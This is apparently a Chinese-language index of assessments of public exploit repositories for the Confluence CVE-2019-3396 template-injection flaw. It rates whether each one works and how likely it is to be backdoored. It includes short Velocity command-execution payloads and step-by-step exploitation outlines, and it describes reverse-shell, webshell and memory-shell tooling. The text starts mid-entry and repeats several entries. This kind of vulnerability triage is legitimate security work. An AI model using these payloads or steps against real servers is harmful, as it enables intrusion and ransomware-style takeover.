CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

